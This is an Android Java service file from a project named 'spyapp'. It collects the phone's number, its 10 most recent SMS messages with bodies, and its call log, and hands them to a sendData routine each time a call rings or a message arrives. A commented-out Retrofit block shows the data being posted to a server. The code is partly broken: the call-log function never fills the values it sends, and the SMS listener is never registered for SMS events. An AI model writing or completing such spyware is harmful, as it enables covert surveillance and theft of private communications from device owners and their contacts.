package com.example.spyapp;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import org.json.JSONArray;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class MyService extends Service {

    String phoneNo = "";
    ArrayList<String> smsList;
    ArrayList<String> callDetailList;

    ArrayList<String> callingNoList, callingDurList, callingTypeList, callingDateList, smsNoList, messageList, smsDateList;
    String callingNo, callingDur, callingType, callingDate, smsNo, message, smsDate;

    String currentTime = "";
    SimpleDateFormat simpleDateFormat;

    Activity activity;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
     //   activity = MainActivity.getActivity();

        simpleDateFormat = new SimpleDateFormat("d-MM-yyyy   hh:mm:ss a", Locale.US);
        currentTime = simpleDateFormat.format(Calendar.getInstance().getTime());

        getPhoneNo(getApplicationContext());
        getSms();
        getCallDetails();
        MainActivity.sendData(phoneNo, currentTime, callingNo, callingDate, callingType, callingDur, smsNo, message, smsDate);


        Toast.makeText(getApplicationContext(), "Service Start", Toast.LENGTH_SHORT).show();
        IntentFilter intentFilter = new IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {

            private String msgBody;

            @Override
            public void onReceive(Context context, Intent intent) {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);

                switch (telephonyManager.getCallState()) {
                    case TelephonyManager.CALL_STATE_RINGING:

                         intent = new Intent(getApplicationContext(), MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     //   startActivity(intent);
                    //    activity = MainActivity.getActivity();

                        getPhoneNo(context);
                        getSms();
                        getCallDetails();
                        MainActivity.sendData(phoneNo, currentTime, callingNo, callingDate, callingType, callingDur, smsNo, message, smsDate);
                        Toast.makeText(context, "call state Ringing", Toast.LENGTH_SHORT).show();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:
                        Toast.makeText(context, "call state idle", Toast.LENGTH_SHORT).show();
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Toast.makeText(context, "call state offhook", Toast.LENGTH_SHORT).show();
                        break;
                }


                if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

                    getPhoneNo(context);
                    getSms();
                    getCallDetails();
                    MainActivity.sendData(phoneNo, currentTime, callingNo, callingDate, callingType, callingDur, smsNo, message, smsDate);
                    Toast.makeText(context, "message received", Toast.LENGTH_SHORT).show();

                    Bundle bundle = intent.getExtras();
                    try {
                        if (bundle != null) {
                            final Object[] pdus = (Object[]) bundle.get("pdus");
                            for (int i = 0; i < pdus.length; i++) {
                                SmsMessage smsMessage;
                                smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i], bundle.getString("format"));

                                //   msg_from = smsMessage.getDisplayOriginatingAddress();
                                msgBody = smsMessage.getMessageBody();
                                //   MainActivity.handleMessage(msgBody);
                            }
                            Toast.makeText(context, "message is:" + msgBody, Toast.LENGTH_SHORT).show();
                        }
                    } catch (Exception e) {
                        Log.d("Exception caught", e.getMessage());
                    }
                }

            }
        };
        registerReceiver(broadcastReceiver, intentFilter);
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressLint("HardwareIds")
    private void getPhoneNo(Context context) {
        try {
            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            phoneNo = tMgr.getLine1Number();

            Toast.makeText(this, phoneNo, Toast.LENGTH_SHORT).show();
        } catch (SecurityException e) {
            Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
        }
    }

   /* private void getSms() {  //by santosh sir
        Uri inboxUri = Uri.parse("content://sms/inbox");
        smsList = new ArrayList<>();

        smsNoList = new ArrayList<>();
        messageList = new ArrayList<>();
        smsDateList = new ArrayList<>();
        ContentResolver contentResolver = getContentResolver();

        Cursor cursor = contentResolver.query(inboxUri, null, null, null, null);
        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
            String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
            Date dateFormat = new Date(Long.parseLong(date));
            String dateTime = simpleDateFormat.format(dateFormat);
            smsList.add("\n" + "number : " + number + "\n\n" + "Message : " + body + "\n\n" + "Date : " + dateTime + "\n");

            smsNoList.add(number);
            messageList.add(body);
            smsDateList.add(dateTime);
        }

        cursor.close();
//        ArrayAdapter<String> adapter = new ArrayAdapter<>(MainActivity.this, android.R.layout.simple_list_item_1, smsList);
//        listView.setAdapter(adapter);

        JSONArray jsonArray = new JSONArray(smsNoList);
        smsNo = jsonArray.toString();

        JSONArray jsonArray2 = new JSONArray(messageList);
        message = jsonArray2.toString();

        JSONArray jsonArray3 = new JSONArray(smsDateList);
        smsDate = jsonArray3.toString();

    }*/
    //-------------------------------------------- sorting by me --------------------------------------------
   /*private void getSms() {
       // URI for the SMS content provider
       Uri inboxUri = Uri.parse("content://sms/inbox");

       smsList = new ArrayList<>();
       smsNoList = new ArrayList<>();
       messageList = new ArrayList<>();
       smsDateList = new ArrayList<>();

       // Sorting by date and limiting to the first 10 messages
       String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 10";

       ContentResolver contentResolver = getContentResolver();

       // to get  the latest 10 incoming SMS
       Cursor cursor = contentResolver.query(inboxUri, null, null, null, sortOrder);

       // Check if the cursor contains any data
       if (cursor != null && cursor.getCount() > 0) {
           simpleDateFormat = new SimpleDateFormat("d-MM-yyyy   hh:mm:ss a", Locale.US);

           while (cursor.moveToNext()) {
               // Get the SMS details
               String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
               String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
               String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));

               // Format the date
               Date dateFormat = new Date(Long.parseLong(date));
               String dateTime = simpleDateFormat.format(dateFormat);

               // Add the SMS details to the list
               smsList.add("\n" + "Number: " + number + "\n\n" + "Message: " + body + "\n\n" + "Date: " + dateTime + "\n");
               smsNoList.add(number);
               messageList.add(body);
               smsDateList.add(dateTime);

               // Log the SMS details in Logcat
               Log.d("SMS", "Number: " + number);
               Log.d("SMS", "Message: " + body);
               Log.d("SMS", "Date: " + dateTime);
           }
           cursor.close();
       }

       // Convert the lists to JSON arrays for further use
       JSONArray jsonArray = new JSONArray(smsNoList);
       smsNo = jsonArray.toString();

       JSONArray jsonArray2 = new JSONArray(messageList);
       message = jsonArray2.toString();

       JSONArray jsonArray3 = new JSONArray(smsDateList);
       smsDate = jsonArray3.toString();
   }*/
   private void getSms() {
       Uri inboxUri = Uri.parse("content://sms/inbox");

       smsList = new ArrayList<>();
       smsNoList = new ArrayList<>();
       messageList = new ArrayList<>();
       smsDateList = new ArrayList<>();

       // Sorting by date
       String sortOrder = Telephony.Sms.DATE + " DESC";  // Sorting only

       ContentResolver contentResolver = getContentResolver();


       Cursor cursor = contentResolver.query(inboxUri, null, null, null, sortOrder);


       if (cursor != null && cursor.getCount() > 0) {
           simpleDateFormat = new SimpleDateFormat("d-MM-yyyy   hh:mm:ss a", Locale.US);
           int count = 0;  // To limit the number of messages

           while (cursor.moveToNext() && count < 10) {  // Limiting to 10 messages in the loop

               String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
               String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
               String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));


               Date dateFormat = new Date(Long.parseLong(date));
               String dateTime = simpleDateFormat.format(dateFormat);


               smsList.add("\n" + "Number: " + number + "\n\n" + "Message: " + body + "\n\n" + "Date: " + dateTime + "\n");
               smsNoList.add(number);
               messageList.add(body);
               smsDateList.add(dateTime);

               // Log see in logcate
               Log.d("SMS", "Number: " + number);
               Log.d("SMS", "Message: " + body);
               Log.d("SMS", "Date: " + dateTime);

               count++;
           }
           cursor.close();
       }


       JSONArray jsonArray = new JSONArray(smsNoList);
       smsNo = jsonArray.toString();

       JSONArray jsonArray2 = new JSONArray(messageList);
       message = jsonArray2.toString();

       JSONArray jsonArray3 = new JSONArray(smsDateList);
       smsDate = jsonArray3.toString();
   }



    /*@SuppressLint("DefaultLocale")
    private void getCallDetails() {

        callDetailList = new ArrayList<>();// that is store all call

        callingNoList = new ArrayList<>();
        callingTypeList = new ArrayList<>();
        callingDurList = new ArrayList<>();
        callingDateList = new ArrayList<>();

        int hours, minutes, seconds;
        String callDuration;

      //  Cursor managedCursor = activity.managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.parseLong(callDate));
            String dateTime = simpleDateFormat.format(callDayTime);
            String responseCallDuration = managedCursor.getString(duration);
            int totalSecs = Integer.parseInt(responseCallDuration);
            hours = totalSecs / 3600;
            minutes = (totalSecs % 3600) / 60;
            seconds = totalSecs % 60;

            callDuration = String.format("%02d:%02d:%02d", hours, minutes, seconds);
            String dir = null;
            int dirCode = Integer.parseInt(callType);
            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            callDetailList.add("\nPhone Number : " + phNumber + "\nCall Type : " + dir + "\nDate : " + dateTime + "\nDuration : " + callDuration + "\n");

            callingNoList.add(phNumber);
            callingTypeList.add(dir);
            callingDurList.add(callDuration);
            callingDateList.add(dateTime);

        }
        managedCursor.close();
//        ArrayAdapter<String> adapter = new ArrayAdapter<>(MainActivity.this, android.R.layout.simple_list_item_1, callDetailList);
//        listView.setAdapter(adapter);

        JSONArray jsonArray = new JSONArray(callingNoList);
        callingNo = jsonArray.toString();

        JSONArray jsonArray2 = new JSONArray(callingTypeList);
        callingType = jsonArray2.toString();

        JSONArray jsonArray3 = new JSONArray(callingDurList);
        callingDur = jsonArray3.toString();

        JSONArray jsonArray4 = new JSONArray(callingDateList);
        callingDate = jsonArray4.toString();

    }*/
    private void getCallDetails() {
        Uri callUri = CallLog.Calls.CONTENT_URI;


        Cursor cursor = getContentResolver().query(
                callUri,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
        );

        if (cursor != null && cursor.getCount() > 0) {
            int count = 0;
            while (cursor.moveToNext() && count < 10) {
                // Safely get column indices
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);


                String phoneNumber = numberIndex != -1 ? cursor.getString(numberIndex) : "Unknown";
                String callType = typeIndex != -1 ? cursor.getString(typeIndex) : "Unknown";
                String callDate = dateIndex != -1 ? cursor.getString(dateIndex) : "Unknown";
                String callDuration = durationIndex != -1 ? cursor.getString(durationIndex) : "Unknown";

                // debugging see in logcat
                // Log.d("CallLog", "Number: " + phoneNumber + ", Type: " + callType + ", Date: " + callDate + ", Duration: " + callDuration);


                count++; //only 10 milenge
            }
            cursor.close();
        } else {
            Log.d("CallLog", "No call logs found.");
        }
    }



//    private void sendData() {
//
//        Call<JsonObject> call = RetrofitClient.getInstance().getInterface().sendData(phoneNo, currentTime, callingNo, callingDate, callingType, callingDur, smsNo, message, smsDate);
//
//        call.enqueue(new Callback<JsonObject>() {
//            @SuppressLint("SetTextI18n")
//            @Override
//            public void onResponse(@NonNull Call<JsonObject> call, @NonNull Response<JsonObject> response) {
//                if (response.isSuccessful()) {
//                    JSONObject jsonObject1;
//                    try {
//                        jsonObject1 = new JSONObject(String.valueOf(response.body()));
//
//                        String statusCode = jsonObject1.getString("statuscode");
//
//                        if (statusCode.equalsIgnoreCase("000")) {
//
//                            Toast.makeText(activity, "success", Toast.LENGTH_SHORT).show();
//                            activity.finish();
//
//                        } else {
//                            Toast.makeText(activity, "ERROR", Toast.LENGTH_SHORT).show();
//                            activity.finish();
//                        }
//
//                    } catch (JSONException e) {
//                        e.printStackTrace();
//                        Toast.makeText(activity, "catch", Toast.LENGTH_SHORT).show();
//                        activity.finish();
//                    }
//
//                } else {
//                    Toast.makeText(activity, response.message(), Toast.LENGTH_SHORT).show();
//                    activity.finish();
//                }
//            }
//
//            @SuppressLint("SetTextI18n")
//            @Override
//            public void onFailure(@NonNull Call<JsonObject> call, @NonNull Throwable t) {
//                  Toast.makeText(activity, "api failed", Toast.LENGTH_SHORT).show();
//                activity.finish();
//            }
//        });
//    }

}
